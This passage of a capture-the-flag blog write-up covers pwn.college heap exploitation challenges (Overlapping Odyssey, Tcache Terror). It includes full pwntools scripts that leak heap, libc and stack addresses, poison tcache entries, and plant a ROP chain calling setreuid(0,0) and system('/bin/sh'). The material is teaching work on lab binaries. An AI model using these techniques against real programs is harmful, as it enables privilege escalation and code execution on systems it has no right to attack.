2\n &#x27;)<br>   ...:     #pause()<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;safe_read \n1 &#x27;)<br>   ...:     p.recvuntil(b&quot;Index: &quot;)<br>   ...:     p.send(b&#x27;k&#x27;*0x3b8 + p64(0x3c0) + p64((heap_base_addr &gt;&gt; 12) ^ (heap_base_addr + 0x8e0)))<br>   ...:     #p.interactive()<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 2\n 944\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;read_flag\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;safe_write\n 1 \n&#x27;)<br>   ...: <br>   ...: p = process(&#x27;/challenge/overlapping-odyssey-easy&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772358110358-de41d021-9efa-4a1c-a33f-b9802683b597.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Overlapping-Odyssey-Hard"><a href="#Overlapping-Odyssey-Hard" class="headerlink" title="Overlapping Odyssey (Hard)"></a><font style="color:#2F8EF4;">Overlapping Odyssey (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772358573755-f6e07d51-2dc2-4b34-b21d-cb4554a636da.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772358672719-9d7a63d7-a436-4bb2-916a-84339b8f82f1.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772359731785-4a6ec8c5-f4ee-4ffa-b080-673c73c6e3f5.png" srcset="/img/loading.gif" lazyload></p>
+<p>when free malloc(440) in easy</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [3]: from pwn import *<br>   ...: context.log_level = &#x27;debug&#x27;<br>   ...: secret_addr = 0x4292e0<br>   ...: def cyc():<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 0\n 30\n&#x27;)<br>   ...:     #p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 1\n 30\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;free\n 0\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 0\n 30\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;safe_write\n 0 \n&#x27;)<br>   ...:     #p.recvuntil(b&quot;[*] safe_write(allocations[0])\n&quot;)<br>   ...:     p.recvuntil(b&quot;Index: &quot;)<br>   ...:     p.recvline()<br>   ...:     #p.recvline()<br>   ...:     en_next = u64(p.recv(5).ljust(8,b&quot;\x00&quot;))<br>   ...:     print(&quot;en_next: &quot;, hex(en_next))<br>   ...:     heap_base_addr = en_next &lt;&lt; 12<br>   ...:     print(&quot;heap_base_addr&quot;,hex(heap_base_addr))<br>   ...:     print(&quot;chunk1&quot;,hex(heap_base_addr+0x8e0))<br>   ...:     print(&quot;9_n&quot;,hex((heap_base_addr &gt;&gt; 12) ^ (heap_base_addr + 0x8e0)))<br>   ...:     #next_p = (heap_base_addr &gt;&gt; 12)^leak_stack<br>   ...:     #gdb.attach(p)<br>   ...:     #pause()<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 1\n 440\n&#x27;)<br>   ...:     #p.interactive()<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 2\n 432\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 3\n432\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;free\n 3\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;free\n 2\n &#x27;)<br>   ...:     #pause()<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;safe_read \n1 &#x27;)<br>   ...:     p.recvuntil(b&quot;Index: &quot;)<br>   ...:     p.send(b&#x27;k&#x27;*0x1b8 + p64(0x1c0) + p64((heap_base_addr &gt;&gt; 12) ^ (heap_base_addr + 0x8e0)))<br>   ...:     #p.interactive()<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 2\n 432\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;read_flag\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;safe_write\n 1 \n&#x27;)<br>   ...: <br>   ...: p = process(&#x27;/challenge/overlapping-odyssey-hard&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772360082799-cbd54f5a-9067-4b40-a712-45a25ffdb7b5.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Tcache-Terror-Easy"><a href="#Tcache-Terror-Easy" class="headerlink" title="Tcache Terror (Easy)"></a><font style="color:#2F8EF4;">Tcache Terror (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772360582712-b289d159-e0ef-41ac-87af-d9eaf2a671c2.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772360596114-d1150bb5-c306-4019-bd39-7dbdce7a8f17.png" srcset="/img/loading.gif" lazyload></p>
+<p>add a rop</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772362180467-a60194b0-a1e0-4616-9b96-78f8cc25522e.png" srcset="/img/loading.gif" lazyload></p>
+<p>&amp;environ is at here</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772362310505-ed33c01f-3d6c-4e4d-97ec-2c1a49ede8a8.png" srcset="/img/loading.gif" lazyload></p>
+<p>It pointer to stack</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772362499348-8aaf8d4f-f7c3-4e34-a19a-edf80eaa848b.png" srcset="/img/loading.gif" lazyload></p>
+<p>Utilize libc_base_addr to get &amp;environ</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772363447460-29c43834-a017-4c2b-9577-8ba0d7151998.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772363459043-1e701751-027b-405c-b986-79e06e0b50ab.png" srcset="/img/loading.gif" lazyload></p>
+<p>leak heap_base_addr</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772367666618-57bbdab0-9391-4853-bbf1-16f504a766ca.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772367738412-8e9fd599-b498-470f-a537-89a5183c364b.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772368152880-85102a4d-ae12-4eec-b92f-ab73c5a1c88d.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772368172841-1e504dab-261b-47f4-bcd2-e1e61f5a6903.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772368181133-5b27e257-b6f1-4128-98c3-a0cd9540f18a.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772369894262-54f7aeb1-6d6e-435f-bbb7-22810d41fe0f.png" srcset="/img/loading.gif" lazyload></p>
+<p>error</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772369912789-445ce623-de89-4296-9c52-004f4e2b8800.png" srcset="/img/loading.gif" lazyload></p>
+<p>the *ptr is at 0x5583fbe4c358</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772370033933-0bb0d07f-3889-4fde-8122-9e8525078154.png" srcset="/img/loading.gif" lazyload></p>
+<p>utilize tele to search in [heap]</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772370724618-4bcc2945-b762-43b3-a7a2-d36a3c0d7965.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772370782605-8db091ec-f528-49a0-9097-fcb8fd247d00.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772371293447-a3c4b6a1-7723-405b-b065-695df01eed8e.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772371238667-a0762b8a-2e2f-4675-b93a-488e24a66cb0.png" srcset="/img/loading.gif" lazyload></p>
+<p>the main_ret is at stack_addr - 0x120</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772371401708-b4804cf7-ed41-464c-94d7-282006b05e00.png" srcset="/img/loading.gif" lazyload></p>
+<p>good</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772371883802-3107fdb2-e93c-445d-a779-6efd8bb95a9a.png" srcset="/img/loading.gif" lazyload></p>
+<p>？？？</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772371897218-ec4d68ba-ed25-4b03-b994-a516c36384f3.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [3]: from pwn import *<br>   ...: #context.log_level = &#x27;debug&#x27;<br>   ...: context.arch = &quot;amd64&quot;<br>   ...: p = process(&#x27;/challenge/tcache-terror-easy&#x27;)<br>   ...: libc = ELF(&#x27;/challenge/lib/libc.so.6&#x27;)<br>   ...: def malloc(idx,size):<br>   ...:     p.recvuntil(b&quot;[*] Function (malloc/free/safe_write/safe_read/quit): &quot;)<br>   ...:     p.sendline(b&quot;malloc&quot;)<br>   ...:     p.recvuntil(b&quot;Index: &quot;)<br>   ...:     p.sendline(str(idx).encode())<br>   ...:     p.recvuntil(b&quot;Size: &quot;)<br>   ...:     p.sendline(str(size).encode())<br>   ...: <br>   ...: def free(idx):<br>   ...:     p.recvuntil(b&quot;[*] Function (malloc/free/safe_write/safe_read/quit): &quot;)<br>   ...:     p.sendline(b&quot;free&quot;)<br>   ...:     p.recvuntil(b&quot;Index: &quot;)<br>   ...:     p.sendline(str(idx).encode())<br>   ...: <br>   ...: def safe_write(idx):<br>   ...:     p.recvuntil(b&quot;[*] Function (malloc/free/safe_write/safe_read/quit): &quot;)<br>   ...:     p.sendline(b&quot;safe_write&quot;)<br>   ...:     p.recvuntil(b&quot;Index: &quot;)<br>   ...:     p.sendline(str(idx).encode())<br>   ...: <br>   ...: def safe_read(idx,content):<br>   ...:     p.recvuntil(b&quot;[*] Function (malloc/free/safe_write/safe_read/quit): &quot;)<br>   ...:     p.sendline(b&quot;safe_read&quot;)<br>   ...:     p.recvuntil(b&quot;Index: &quot;)<br>   ...:     p.sendline(str(idx).encode())<br>   ...:     p.send(content)<br>   ...: malloc(0, 0x20)<br>   ...: free(0)<br>   ...: malloc(0, 0x20)<br>   ...: safe_write(0)<br>   ...: p.recvline()<br>   ...: p.recvline()<br>   ...: en_next = u64(p.recv(5).ljust(8,b&#x27;\x00&#x27;))<br>   ...: print(&quot;en_next: &quot;, hex(en_next))<br>   ...: heap_base_addr = en_next &lt;&lt; 12<br>   ...: print(&quot;heap_base_addr&quot;,hex(heap_base_addr))<br>   ...: malloc(0, 0x38)<br>   ...: malloc(1, 0x38)<br>   ...: malloc(2, 0x38)<br>   ...: free(2)<br>   ...: free(1)<br>   ...: pause()<br>   ...: safe_read(0, b&#x27;a&#x27;*0x38 + p64(0x41) + p64((heap_base_addr &gt;&gt; 12) ^ (heap_base_addr + 0x340)))<br>   ...: malloc(1, 0x38)<br>   ...: malloc(3, 0x38)<br>   ...: safe_read(3,b&#x27;a&#x27;*0x18)<br>   ...: safe_write(3)<br>   ...: p.recvline()<br>   ...: p.recvline()<br>   ...: p.recv(0x18)<br>   ...: libc_base = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;)) - 0x21a6a0<br>   ...: print(&quot;libc_base_addr:&quot;,hex(libc_base))<br>   ...: pause()<br>   ...: environ_addr = libc_base + 0x221200<br>   ...: malloc(0, 0x38)<br>   ...: malloc(1, 0x38)<br>   ...: malloc(2, 0x38)<br>   ...: free(2)<br>   ...: free(1)<br>   ...: safe_read(0, b&#x27;a&#x27;*0x38 + p64(0x41) + p64((heap_base_addr &gt;&gt; 12) ^ environ_addr))<br>   ...: malloc(1, 0x38)<br>   ...: malloc(3, 0x38)<br>   ...: safe_write(3)<br>   ...: p.recvline()<br>   ...: p.recvline()<br>   ...: stack_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br>   ...: print(&quot;stack_addr:&quot;,hex(stack_addr))<br>   ...: ret_addr = stack_addr-0x120<br>   ...: print(&quot;ret_addr:&quot;,hex(ret_addr))<br>   ...: pause()<br>   ...: malloc(0, 0x38)<br>   ...: malloc(1, 0x38)<br>   ...: malloc(2, 0x38)<br>   ...: free(2)<br>   ...: free(1)<br>   ...: safe_read(0, b&#x27;a&#x27;*0x38 + p64(0x41) + p64((heap_base_addr &gt;&gt; 12) ^ (ret_addr - 0x8)))<br>   ...: malloc(1, 0x38)<br>   ...: malloc(3, 0x38)<br>   ...: libc.address = libc_base<br>   ...: sys_addr = libc.symbols[&#x27;system&#x27;]<br>   ...: binsh_addr = next(libc.search(b&#x27;/bin/sh&#x27;))<br>   ...: setreuid_addr = libc.symbols[&#x27;setreuid&#x27;]<br>   ...: print(&quot;setreuid_addr&quot;, hex(setreuid_addr))<br>   ...: print(&quot;binsh_addr&quot;, hex(binsh_addr))<br>   ...: rop = ROP(libc)<br>   ...: ruid = 0<br>   ...: euid = 0<br>   ...: rop.raw(rop.rdi)<br>   ...: rop.raw(ruid)<br>   ...: rop.raw(rop.rsi)<br>   ...: rop.raw(euid)<br>   ...: rop.raw(setreuid_addr)<br>   ...: rop.raw(rop.rdi)<br>   ...: rop.raw(binsh_addr)<br>   ...: rop.raw(sys_addr)<br>   ...: <br>   ...: safe_read(3, p64(0xdeadbeef) + rop.chain())<br>   ...: p.recvuntil(b&quot;[*] Function (malloc/free/safe_write/safe_read/quit): &quot;)<br>   ...: p.sendline(b&#x27;quit&#x27;)<br>   ...:     #out =<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772372079212-f9653400-20d3-40e5-b4d7-b4d0c7b818b9.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Tcache-Terror-Hard"><a href="#Tcache-Terror-Hard" class="headerlink" title="Tcache Terror (Hard)"></a><font style="color:#2F8EF4;">Tcache Terror (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772375033719-e630269e-2f17-4787-a6b3-6ba083df4253.png" srcset="/img/loading.gif" lazyload></p>
+<p>find *ptr at [heap]</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772375148696-e86ed9e1-b1ae-44fc-99e7-3587768ec398.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772375327657-a62f751c-000c-4826-8b73-815fc977d7dc.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id=""><a href="#" class="headerlink" title=""></a></h5>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn-college/" class="category-chain-item">pwn.college</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/heap/" class="print-no-link">#heap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pwn.college-pro sec-_Dynamic Allocator Misuse</div>
+      <div>https://ghostshark-pro.github.io/2026/04/23/pwn.college-pro sec-_Dynamic Allocator Misuse/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>shark</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted</div>
+          <div>2026年4月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>License</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/23/pwn.college-pro%20sec-_Program%20Explotation/" title="pwn.college-pro sec-_Program Explotation">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">pwn.college-pro sec-_Program Explotation</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/23/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/" title="Polarisctf招新赛">
+                        <span class="hidden-mobile">Polarisctf招新赛</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>TOC</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Grep</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
